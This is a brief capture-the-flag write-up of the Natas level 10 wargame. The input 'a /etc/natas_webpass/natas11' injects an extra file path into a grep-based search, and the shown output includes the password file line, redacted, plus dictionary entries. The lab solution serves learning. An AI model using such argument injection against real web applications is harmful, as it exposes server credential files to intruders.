According to the natas10 webpage we have to use the username natas10 and the password from the previous challenge that we found.


As per the previous problem we need access to  /etc/natas_webpass/natas11. So we use the payload ---
"a  /etc/natas_webpass/natas11" to get the password.


/etc/natas_webpass/natas11:<password>
dictionary.txt:African
dictionary.txt:Africans
dictionary.txt:Allah
dictionary.txt:Allah's
dictionary.txt:American
dictionary.txt:Americanism
dictionary.txt:Americanism's
...


And we get the password.
